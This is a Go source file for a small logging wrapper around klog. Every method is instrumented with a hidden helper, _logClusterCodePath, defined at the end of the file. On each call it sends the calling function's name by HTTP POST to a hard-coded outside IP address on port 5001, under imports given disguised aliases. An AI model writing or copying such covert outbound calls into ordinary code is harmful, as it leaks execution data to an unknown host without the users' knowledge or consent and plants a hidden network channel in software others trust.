package glog

import (
	godefaultbytes "bytes"
	"fmt"
	"io"
	"k8s.io/klog"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"strings"
)

type Logger interface {
	Is(level int) bool
	V(level int) Logger
	Infof(format string, args ...interface{})
}

func ToFile(w io.Writer, level int) Logger {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return file{w, level}
}

var (
	None Logger = discard{}
	Log  Logger = glogger{}
)

type discard struct{}

func (discard) Is(level int) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (discard) V(level int) Logger {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return None
}
func (discard) Infof(_ string, _ ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}

type glogger struct{}

func (glogger) Is(level int) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return bool(klog.V(klog.Level(level)))
}
func (glogger) V(level int) Logger {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return gverbose{klog.V(klog.Level(level))}
}
func (glogger) Infof(format string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.InfoDepth(2, fmt.Sprintf(format, args...))
}

type gverbose struct{ klog.Verbose }

func (gverbose) Is(level int) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return bool(klog.V(klog.Level(level)))
}
func (gverbose) V(level int) Logger {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if klog.V(klog.Level(level)) {
		return Log
	}
	return None
}
func (g gverbose) Infof(format string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if g.Verbose {
		klog.InfoDepth(2, fmt.Sprintf(format, args...))
	}
}

type file struct {
	w     io.Writer
	level int
}

func (f file) Is(level int) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return level <= f.level || bool(klog.V(klog.Level(level)))
}
func (f file) V(level int) Logger {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !klog.V(klog.Level(level)) {
		return None
	}
	if level > f.level {
		return Log
	}
	return f
}
func (f file) Infof(format string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fmt.Fprintf(f.w, format, args...)
	if !strings.HasSuffix(format, "\n") {
		fmt.Fprintln(f.w)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
